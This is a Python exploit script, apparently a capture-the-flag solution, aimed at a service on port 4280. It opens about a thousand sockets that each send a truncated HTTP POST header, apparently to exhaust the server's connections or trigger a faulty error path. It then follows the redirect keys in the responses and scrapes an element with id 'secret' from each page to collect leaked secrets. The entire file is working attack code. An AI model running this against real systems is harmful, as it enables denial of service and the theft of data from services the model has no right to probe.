import socket
import errno
import requests
import re

from bs4 import BeautifulSoup

import sys
host = sys.argv[1] if len(sys.argv) > 1 else 'localhost'

payload = b'POST / HTTP/1.1\nHost: localhost:4280\nUser-Agent: python-requests/2.18.4\n' + \
	b'Accept-Encoding: gzip, deflate\nAccept: */*\nConnection: keep-alive\nContent-Length'

sockets = []
for i in range(1024 - 7):
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((host, 4280))
	s.setblocking(0)
	s.send(payload)
	sockets.append(s)

found = set()
for s in sockets:
	data = b''
	for _ in range(100):
		try:
			data = s.recv(4096).decode('utf-8')
			break
		except socket.error as e:
			if e.errno != errno.EAGAIN and e.errno != errno.EWOULDBLOCK:
				break
	s.close()
	if len(data) == 0:
		continue
	try:
		key = re.search(r'Location: /([A-Z]+)', data).group(1)
		response = requests.get('http://' + host + ':4280/' + key)
		soup = BeautifulSoup(response.text, features="html.parser")
		secret = soup.find(id="secret").text
		if secret != '':
			found.add(secret)
	except:
		pass

for secret in found:
	print('Found:', secret)